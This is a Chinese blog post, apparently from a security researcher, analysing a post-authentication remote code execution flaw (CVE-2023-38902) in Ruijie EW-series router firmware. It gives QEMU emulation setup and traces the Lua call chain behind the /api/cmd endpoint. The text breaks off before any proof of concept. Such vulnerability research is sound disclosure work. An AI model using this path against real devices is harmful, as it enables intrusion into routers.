<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"zikh26.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"default"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="前言这是我收获的第一个 CVE 编号，在复现了 winmt 师傅的 CVE-2023-34644 后，他告诉我最新的固件虽然做了一些简单的处理，导致无法在未授权的情况下 RCE ，但因为没有从根源上对命令执行点做限制，所以在授权后，仍然可以进行 RCE 。我对最新的固件进行了分析，完整记录了授权后的 RCE 漏洞从分析到利用的过程。从提交漏洞到现在也有半年的时间了，并且锐捷官网也已经发布了最新的固">
<meta property="og:type" content="article">
<meta property="og:title" content="关于锐捷网络EW系列路由器存在授权后RCE漏洞的研究">
<meta property="og:url" content="https://zikh26.github.io/posts/cf175daa.html">
<meta property="og:site_name" content="ZIKH26&#39;s Blog">
<meta property="og:description" content="前言这是我收获的第一个 CVE 编号，在复现了 winmt 师傅的 CVE-2023-34644 后，他告诉我最新的固件虽然做了一些简单的处理，导致无法在未授权的情况下 RCE ，但因为没有从根源上对命令执行点做限制，所以在授权后，仍然可以进行 RCE 。我对最新的固件进行了分析，完整记录了授权后的 RCE 漏洞从分析到利用的过程。从提交漏洞到现在也有半年的时间了，并且锐捷官网也已经发布了最新的固">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651514.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651567.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651468.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651476.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651426.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651435.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651524.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651516.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651606.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651092.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651741.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231655305.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231655308.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231655314.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231655309.png">
<meta property="article:published_time" content="2024-02-22T13:50:16.000Z">
<meta property="article:modified_time" content="2024-06-06T05:11:24.371Z">
<meta property="article:author" content="ZIKH26">
<meta property="article:tag" content="MIPS架构">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651514.png">


<link rel="canonical" href="https://zikh26.github.io/posts/cf175daa.html">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://zikh26.github.io/posts/cf175daa.html","path":"posts/cf175daa.html","title":"关于锐捷网络EW系列路由器存在授权后RCE漏洞的研究"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>关于锐捷网络EW系列路由器存在授权后RCE漏洞的研究 | ZIKH26's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">ZIKH26's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-友链"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BF%E7%9C%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">仿真环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#lua%E6%96%87%E4%BB%B6%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="nav-number">3.1.</span> <span class="nav-text">lua文件调用链分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#lua%E6%96%B0%E7%89%88%E6%9C%AC219-%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="nav-number">3.1.1.</span> <span class="nav-text">lua新版本219 调用链分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#219%E7%89%88%E6%9C%AC%E4%B9%8B%E5%89%8D%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-number">3.1.2.</span> <span class="nav-text">219版本之前的调用链</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%9C%80%E6%96%B0%E7%89%88%E4%B8%8D%E8%83%BD%E5%86%8D%E8%B5%B0%E8%BF%99%E6%9D%A1%E9%93%BE%E4%BA%86%EF%BC%9F"><span class="nav-number">3.1.3.</span> <span class="nav-text">为什么最新版不能再走这条链了？</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞文件分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E6%AE%B5%E8%A7%A3%E6%9E%90"><span class="nav-number">3.2.1.</span> <span class="nav-text">字段解析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="nav-number">3.2.2.</span> <span class="nav-text">触发漏洞的调用链分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-remotePwd-%E5%AD%97%E6%AE%B5%E6%97%A0%E6%B3%95%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%EF%BC%9F"><span class="nav-number">3.2.3.</span> <span class="nav-text">为什么 remotePwd 字段无法注入命令？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%8A%A5%E6%96%87%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%99%E4%B9%88%E6%9E%84%E9%80%A0%EF%BC%9F"><span class="nav-number">3.2.4.</span> <span class="nav-text">攻击报文为什么这么构造？</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA"><span class="nav-number">4.</span> <span class="nav-text">攻击演示</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POC"><span class="nav-number">4.1.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C"><span class="nav-number">4.2.</span> <span class="nav-text">攻击效果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="nav-number">5.</span> <span class="nav-text">修复方案</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E4%BF%A1%E6%81%AF"><span class="nav-number">6.</span> <span class="nav-text">参考信息</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="ZIKH26"
      src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
  <p class="site-author-name" itemprop="name">ZIKH26</p>
  <div class="site-description" itemprop="description">人生如戏</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">115</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">18</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">115</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/cf175daa.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="人生如戏">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="关于锐捷网络EW系列路由器存在授权后RCE漏洞的研究 | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          关于锐捷网络EW系列路由器存在授权后RCE漏洞的研究
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-02-22 21:50:16" itemprop="dateCreated datePublished" datetime="2024-02-22T21:50:16+08:00">2024-02-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-06-06 13:11:24" itemprop="dateModified" datetime="2024-06-06T13:11:24+08:00">2024-06-06</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/IOT%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是我收获的第一个 <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38902">CVE</a> 编号，在复现了 <strong>winmt</strong> 师傅的 <code>CVE-2023-34644</code> 后，他告诉我最新的固件虽然做了一些简单的处理，导致无法在未授权的情况下 <code>RCE</code> ，但因为没有从根源上对命令执行点做限制，所以在授权后，仍然可以进行 <code>RCE</code> 。我对最新的固件进行了分析，完整记录了授权后的 <code>RCE</code> 漏洞从分析到利用的过程。从提交漏洞到现在也有半年的时间了，并且锐捷官网也已经发布了最新的固件，现将该文章分享出来，供大家进行学习和研究。</p>
<span id="more"></span>	

<p>PS:本文记录的部分内容和 <a href="https://zikh26.github.io/posts/e5651b4f.html">站在巨人肩膀上复现CVE-2023-34644 | ZIKH26’s Blog</a> 这篇文章中的部分内容有相似之处，因为对前期的 <code>lua</code> 文件分析基本一致。为了保证读任何一篇单独的文章都较为通顺和连贯，因此就保留了两篇文章中相似的部分。</p>
<h2 id="仿真环境搭建"><a href="#仿真环境搭建" class="headerlink" title="仿真环境搭建"></a>仿真环境搭建</h2><p>仿真环境搭建请参考 <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-277386.htm#msg_header_h2_4">https://bbs.kanxue.com/thread-277386.htm#msg_header_h2_4</a></p>
<p>该文章详细记录了锐捷 <code>EW</code> 型号路由器的仿真过程</p>
<p><code>qemu</code> 的启动脚本如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">    -cpu 74Kf \</span><br><span class="line">    -M malta \</span><br><span class="line">    -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">    -net nic \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -nographic</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中的 <code> vmlinux-3.2.0-4-4kc-malta</code> 和 <code>debian_squeeze_mipsel_standard.qcow2</code>  文件从 <a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/mipsel/">https://people.debian.org/~aurel32/qemu/mipsel/</a>   进行下载</p>
<p>在执行 <code>qemu</code> 启动脚本之前，执行下面的脚本，创建一个网桥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sudo ifconfig eth0 down                 <span class="comment"># 首先关闭宿主机网卡接口</span></span></span><br><span class="line">sudo brctl addbr br0                     # 添加一座名为 br0 的网桥</span><br><span class="line">sudo brctl addif br0 ens33                # 在 br0 中添加一个接口</span><br><span class="line">sudo brctl stp br0 off                   # 如果只有一个网桥，则关闭生成树协议</span><br><span class="line">sudo brctl setfd br0 1                   # 设置 br0 的转发延迟</span><br><span class="line">sudo brctl sethello br0 1                # 设置 br0 的 hello 时间</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up     # 启用 br0 接口</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up    # 启用网卡接口</span><br><span class="line">sudo dhclient br0                        # 从 dhcp 服务器获得 br0 的 IP 地址</span><br><span class="line">sudo brctl show br0                      # 查看虚拟网桥列表</span><br><span class="line">sudo brctl showstp br0                   # 查看 br0 的各接口信息</span><br><span class="line">sudo tunctl -t tap0 -u root              # 创建一个 tap0 接口，只允许 root 用户访问</span><br><span class="line">sudo brctl addif br0 tap0                # 在虚拟网桥中增加一个 tap0 接口</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up    # 启用 tap0 接口</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure>







<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="lua文件调用链分析"><a href="#lua文件调用链分析" class="headerlink" title="lua文件调用链分析"></a>lua文件调用链分析</h3><h4 id="lua新版本219-调用链分析"><a href="#lua新版本219-调用链分析" class="headerlink" title="lua新版本219 调用链分析"></a>lua新版本219 调用链分析</h4><p>在 <code>usr/lib/lua/luci/modules/cmd.lua</code> 文件中有如下代码，容易让初学者搞混，所以在此简单说明一下</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> opt = &#123;<span class="string">&quot;add&quot;</span>, <span class="string">&quot;del&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;set&quot;</span>, <span class="string">&quot;clear&quot;</span>, <span class="string">&#x27;doc&#x27;</span>&#125;</span><br><span class="line">acConfig, devConfig, devSta, devCap = &#123;&#125;, &#123;&#125;, &#123;&#125;, &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, #opt <span class="keyword">do</span></span><br><span class="line">......</span><br><span class="line">    devSta[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span> </span><br><span class="line">        <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">        params.method = opt[i]</span><br><span class="line">        params.cfg_cmd = <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">        <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">......    </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先是先定义了一个表 <code>opt</code> 里面装了字符串 <code>add</code>  <code>del</code> <code>upload</code> 等字符串，然后又定义了四张空表 <code>acConfig</code> <code>devConfig</code> <code>devSta</code> <code>devCap</code> ，接下来是一个 <code>for</code> 循环来遍历 <code>opt</code> 表。</p>
<p>以 <code>devSta[opt[i]] = function(params) </code> 这行代码为例，假设现在 <code>opt[i]</code> 是元素 <code>add</code>，<code>function(params)</code> 这里是声明了一个匿名函数，因为函数也是一个变量，这个变量被直接存储到了 <code>devSta</code> 表中，以键值的形式存在，键就是字符串 <code>add</code> 而值就是这个函数，之后调用这个函数的话可以直接写 <code>devSta[&quot;add&quot;]()</code>    </p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line">        <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">        params.method = opt[i]</span><br><span class="line">        params.cfg_cmd = <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">        <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">devSta[<span class="string">&quot;add&quot;</span>] = hello <span class="comment">--假设此时遍历到了opt表中的add元素</span></span><br></pre></td></tr></table></figure>

<p>为什么特别说明这里呢？因为我在开始分析的时候，我一直以为这里是匹配到对应的键值后直接去执行函数，导致在此处执行了 <code>doParams</code> <code>fetch</code> 函数（实际上通过上面的分析也知道，这里只是定义了这些函数，并没有进行调用）</p>
<p>下面开始正式从入口分析 <code>/api/cmd</code> 的这条链，在 <code>/usr/lib/lua/luci/controller/eweb/api.lua</code> 文件中存在 <code>entry(&#123;&quot;api&quot;, &quot;cmd&quot;&#125;, call(&quot;rpc_cmd&quot;), nil)</code> 这行代码，意味着授权后访问 <code>/api/cmd</code> 路径时，可以调用 <code>rpc_cmd</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rpc_cmd</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> jsonrpc = <span class="built_in">require</span> <span class="string">&quot;luci.utils.jsonrpc&quot;</span></span><br><span class="line">    <span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">&quot;luci.http&quot;</span></span><br><span class="line">    <span class="keyword">local</span> ltn12 = <span class="built_in">require</span> <span class="string">&quot;luci.ltn12&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _tbl = <span class="built_in">require</span> <span class="string">&quot;luci.modules.cmd&quot;</span></span><br><span class="line">    http.prepare_content(<span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">    ltn12.pump.all(jsonrpc.handle(_tbl, http.source()), http.<span class="built_in">write</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>通过分析 <code>rpc_cmd</code> 函数得知 <code>_tbl</code> 已经包含了 <code>cmd.lua</code> 中所有变量的定义（上文已经分析过了），主要是 <code>ac_config</code> <code>dev_config</code> <code>dev_sta</code> 这三个表包含了 <code>add</code> <code>del</code> <code>update</code> <code>get</code> <code>set</code> <code>clear</code> <code>doc</code> 这些操作，而 <code>devCap</code> 表只有 <code>get</code> ，相关代码如下</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> opt = &#123;<span class="string">&quot;add&quot;</span>, <span class="string">&quot;del&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;set&quot;</span>, <span class="string">&quot;clear&quot;</span>, <span class="string">&#x27;doc&#x27;</span>&#125;</span><br><span class="line">acConfig, devConfig, devSta, devCap = &#123;&#125;, &#123;&#125;, &#123;&#125;, &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, #opt <span class="keyword">do</span></span><br><span class="line">    acConfig[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">        <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;ac_config&quot;</span></span><br><span class="line">        params.method = opt[i]</span><br><span class="line">        params.cfg_cmd = <span class="string">&quot;ac_config&quot;</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">        <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    devConfig[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">        <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_config&quot;</span></span><br><span class="line">        params.method = opt[i]</span><br><span class="line">        params.cfg_cmd = <span class="string">&quot;dev_config&quot;</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">        <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    devSta[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span> </span><br><span class="line">        <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">        params.method = opt[i]</span><br><span class="line">        params.cfg_cmd = <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">        <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> opt[i] == <span class="string">&quot;get&quot;</span> <span class="keyword">then</span></span><br><span class="line">        devCap[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">            <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_cap&quot;</span></span><br><span class="line">            params.method = opt[i]</span><br><span class="line">            params.cfg_cmd = <span class="string">&quot;dev_cap&quot;</span></span><br><span class="line">            <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">            <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, ip, password)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> opt[i] == <span class="string">&quot;doc&quot;</span> <span class="keyword">then</span></span><br><span class="line">        syshell = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">            <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">            <span class="keyword">return</span> tool.doc(params)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>然后来看 <code>rpc_cmd</code> 函数中的这行代码 <code>ltn12.pump.all(jsonrpc.handle(_tbl, http.source()), http.write)</code></p>
<p><code>jsonrpc.handle</code> 函数的参数是 <code>_tbl</code> ，看下 <code>luci.utils.jsonrpc</code> 文件中的 <code>handle</code> 函数，发现又将参数 <code>tbl</code> 传给了 <code>resolve</code> ，同时传入的还有报文中的 <code>method</code> 字段</p>
